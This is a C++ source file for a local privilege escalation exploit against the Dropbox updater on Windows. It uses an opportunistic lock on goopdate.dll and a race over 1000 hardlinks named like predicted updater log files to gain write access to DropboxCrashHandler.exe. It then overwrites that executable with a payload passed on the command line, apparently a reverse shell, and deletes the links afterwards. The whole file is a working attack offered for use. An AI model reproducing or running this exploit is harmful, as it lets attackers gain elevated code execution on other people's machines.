#include "stdafx.h"

#include <stdio.h>
#include <tlhelp32.h>
#include <comdef.h>
#include <chrono>
#include <iostream>
#include <time.h>
#include <stdlib.h>
#include <fstream>

static FileOpLock* oplock = nullptr;
static struct tm* good_time;
static int dropbox_pid = -1;
static WCHAR* overwrite_target = (WCHAR*)L"C:\\Program Files (x86)\\Dropbox\\Update\\1.3.241.1\\DropboxCrashHandler.exe";
static char* rev_shell = NULL;
static char logfile_format[150];

void HandleOplock() {
	puts("[+] OpLock triggered");
	puts("[+] Looking for DropboxUpdate.exe PID");
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[!] Failed to get processes snapshot: %i\n", GetLastError());
		exit(-1);
	}

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hSnap, &entry)) {
		fprintf(stderr, "[!] Failed to get first process entry: %i\n", GetLastError());
		exit(-1);
	}

	const char* proc_name = "DropboxUpdate.exe";

	do {
		_bstr_t current_proc(entry.szExeFile);
		if (strcmp(current_proc, proc_name) == 0) {
			dropbox_pid = entry.th32ProcessID;
			printf("[+] Found %s! PID: %i.\n", proc_name, dropbox_pid);

			struct tm* newtime;
			time_t long_time;
			time(&long_time);
			newtime = gmtime(&long_time);
			unsigned int second = (newtime->tm_sec + 3) % 60;
			
			printf("[+] Waiting till %02d:%02d:%02d to create hardlinks\n", newtime->tm_hour, newtime->tm_min, second);

			while (true) {
				time_t long_good_time;
				time(&long_good_time);
				good_time = gmtime(&long_good_time);
				if (good_time->tm_sec == second) {
					puts("[+] Now it's a good time, hold on");
					break;
				}
			}

			sprintf_s(
				logfile_format,
				"C:\\ProgramData\\Dropbox\\Update\\Log\\DropboxUpdate.log-%d-%02d-%02d-%02d-%02d-%02d-%%03d-%d",
				good_time->tm_year + 1900,
				good_time->tm_mon + 1,
				good_time->tm_mday,
				good_time->tm_hour,
				good_time->tm_min,
				good_time->tm_sec,
				entry.th32ProcessID
			);

			for (int i = 0; i < 1000; i++) {
				char buffer[150];
				sprintf_s(
					buffer,
					"C:\\ProgramData\\Dropbox\\Update\\Log\\DropboxUpdate.log-%d-%02d-%02d-%02d-%02d-%02d-%03d-%d",
					good_time->tm_year + 1900,
					good_time->tm_mon + 1,
					good_time->tm_mday,
					good_time->tm_hour,
					good_time->tm_min,
					good_time->tm_sec,
					i,
					entry.th32ProcessID
				);
				//strncpy_s(logfile_format, buffer, 150);

				std::wstring w;
				std::copy(buffer, buffer + strlen(buffer), std::back_inserter(w));
				const WCHAR* path = w.c_str();
				bool res = CreateNativeHardlink(path, overwrite_target);
				if (!res) {
					printf("[!] Failed to create hardlinks at %d links", i);
					exit(-1);
				}
			}
			puts("[+] Created 999 hardlinks");
			return;
		}
	} while (Process32Next(hSnap, &entry));
	puts("[!] Couldn't find DropboxUpdater.exe process");
	exit(-1);
}

void CheckIfTargetWriteable() {
	printf("[+] Checking if target is writable ");
	while (true) {
		FILE* stream;
		_bstr_t target(overwrite_target);
		if (fopen_s(&stream, target, "w") == 0) {
			_fcloseall();
			puts("");
			printf("[+] Looks good! Now you should have full privs to %ls\n", overwrite_target);
			return;
		}
		printf(".");
		Sleep(1000);
	}
}

void OverwriteTarget() {
	BOOL res = FALSE;
	size_t sz;
	size_t szsz = strlen(rev_shell) + 1;
	wchar_t* buffer = new wchar_t[szsz];
	mbstowcs_s(&sz, buffer, szsz, rev_shell, szsz-1);
	printf("[+] trying to overwrite target file %ls\n", buffer);
	CopyFile(buffer, overwrite_target, res);
	puts("[+] target file overwritten");
}

void CleanUp() {
	puts("[+] cleaning up Dropbox log directory");
	for (int i = 0; i < 1000; i++) {
		char buffer[150];
		sprintf_s(buffer, logfile_format, i);
		std::wstring w;
		std::copy(buffer, buffer + strlen(buffer), std::back_inserter(w));
		const WCHAR* path = w.c_str();
		DeleteFile(path);
	}
	puts("[+] log directory clean");
}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		puts("Usage: %s payload.exe");
		return 0;
	}
	rev_shell = argv[1];
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[!] Failed to get processes snapshot: %i\n", GetLastError());
		return 1;
	}

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hSnap, &entry)) {
		fprintf(stderr, "[!] Failed to get first process entry: %i\n", GetLastError());
		return 2;
	}

	const char* proc_name = "DropboxUpdate.exe";
	
	do {
		_bstr_t current_proc(entry.szExeFile);
		if (strcmp(current_proc, proc_name) == 0) {
			printf("[+] Found %s! PID: %i. Can't exploit it when it's already running!\n", proc_name, entry.th32ProcessID);
			return -1;
		}
	} while (Process32Next(hSnap, &entry));

	puts("[+] Updater process not found. Proceeding with exploit");
	puts("[+] Creating lock and waiting for updater process");
	
	LPCWSTR target = TEXT("C:\\Program Files (x86)\\Dropbox\\Update\\1.3.241.1\\goopdate.dll");
	LPCWSTR share_mode = TEXT("x");
	oplock = FileOpLock::CreateLock(target, share_mode, HandleOplock);
	if (oplock != nullptr) {
		oplock->WaitForLock(INFINITE);
		delete oplock;
	}
	else {
		printf("[!] Error creating oplock\n");
		return 1;
	}
	CheckIfTargetWriteable();
	OverwriteTarget();
	CleanUp();
	return 0;
}